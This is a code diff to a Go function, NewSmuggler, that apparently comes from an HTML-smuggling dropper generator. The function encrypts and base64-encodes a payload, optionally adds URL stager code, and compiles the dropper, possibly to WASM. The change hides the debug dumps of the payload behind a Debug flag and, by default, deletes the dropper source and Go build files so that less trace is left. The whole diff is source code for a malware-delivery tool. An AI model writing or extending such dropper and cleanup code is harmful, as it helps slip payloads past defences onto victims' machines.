@@ -45,25 +45,28 @@ func NewSmuggler(dropname, input, output, url, image, host, useragent string) {
 	fileBuf.AESEncrypt()
 	goDrop.BufStr = `"` + fileBuf.ToB64() + `"`
 	goDrop.KeyStr = `"` + fileBuf.KeyB64() + `"`
-	scFilepath := filepath.Join(output, dropname+"_encryptedB64.txt")
-	//Write fileBuf files in case they are needed later.
-	scFile, err := os.Create(scFilepath)
-	if err != nil {
-		log.Fatalf("Error creating smuggle file: %v ", err)
+	if Debug {
+		//Write fileBuf files in case they are needed later.
+		scFilepath := filepath.Join(output, dropname+"_encryptedB64.txt")
+		scFile, err := os.Create(scFilepath)
+		if err != nil {
+			log.Fatalf("Error creating smuggle file: %v ", err)
+
+		}
+		scFile.WriteString("SmuggleKey: " + goDrop.KeyStr + "\n")
+		scFile.WriteString("SmuggleBuf:\n" + goDrop.BufStr)
+		scFile.Close()
+		binFilepath := filepath.Join(output, dropname+"_Clear.bin")
+		fmt.Println(binFilepath)
+		binFile, err := os.Create(binFilepath)
+		if err != nil {
+			log.Fatalf("Error creating smuggle file: %v ", err)
+
+		}
+		binFile.Write(fileBuf.Buf)
+		binFile.Close()
 
 	}
-	scFile.WriteString("SmuggleKey: " + goDrop.KeyStr + "\n")
-	scFile.WriteString("SmuggleBuf:\n" + goDrop.BufStr)
-	scFile.Close()
-	binFilepath := filepath.Join(output, dropname+"_Clear.bin")
-	fmt.Println(binFilepath)
-	binFile, err := os.Create(binFilepath)
-	if err != nil {
-		log.Fatalf("Error creating smuggle file: %v ", err)
-
-	}
-	binFile.Write(fileBuf.Buf)
-	binFile.Close()
 
 	//Add stager code if url is set.
 	if url != "" {
@@ -99,13 +102,35 @@ func NewSmuggler(dropname, input, output, url, image, host, useragent string) {
 		log.Fatalf("Error writing dropper source:\n%v\n", err)
 	}
 	dropperFile.Close()
-	color.Green("Smuggler src written to: %s\n", dropFilepath)
+	if Debug {
+		color.Green("Smuggler src written to: %s\n", dropFilepath)
+	}
 
 	wd, _ := os.Getwd()
 
 	//compile the dropper with the regular go compiler.
 	if Leet {
 		buildWasm(output, dropfilename)
+	}
+
+	if !Debug {
+
+		err = os.Remove(dropfilename)
+		if err != nil {
+			log.Print(err)
+		}
+		err = os.Remove("go.mod")
+		if err != nil {
+			log.Print(err)
+		}
+		err = os.Remove("go.sum")
+		if err != nil {
+			log.Print(err)
+		}
+		err = os.Remove("goenv.txt")
+		if err != nil {
+			log.Print(err)
+		}
 	}
 
 	fmt.Printf("Example HTML:\n")
